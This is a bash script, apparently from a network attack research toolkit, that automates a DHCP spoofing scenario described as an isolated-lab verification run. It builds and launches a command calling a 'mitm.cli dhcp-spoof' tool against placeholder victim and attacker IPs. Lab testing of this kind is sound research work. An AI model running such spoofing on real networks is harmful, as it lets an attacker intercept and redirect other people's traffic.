#!/usr/bin/env bash
set -euo pipefail

# shellcheck source=/dev/null
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/common.sh"

DURATION="${1:-${DURATION:-30}}"
REMOTE_ROOT="$(research_workspace_root)"
ATTACK_RUNTIME=$((DURATION - 10))
ATTACK_CMD="sleep 5; cd '${REMOTE_ROOT}' && exec timeout -s INT ${ATTACK_RUNTIME} env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-spoof --interface vnic0 --victim-ip __VICTIM_IP__ --server-ip __ATTACKER_IP__ --interval 1.0"

PLAN_DURATION_SECONDS="${DURATION}" \
PLAN_ATTACK_START_OFFSET_SECONDS="5" \
PLAN_ATTACK_STOP_OFFSET_SECONDS="$((DURATION - 5))" \
PLAN_FORWARDING_ENABLED="0" \
PLAN_DNS_SPOOF_ENABLED="0" \
run_automated_scenario_recording \
  "dhcp-spoof" \
  "${DURATION}" \
  "Automated DHCP spoof offer and ACK broadcast verification run in the isolated lab" \
  "dhcp-spoof" \
  "${ATTACK_CMD}"
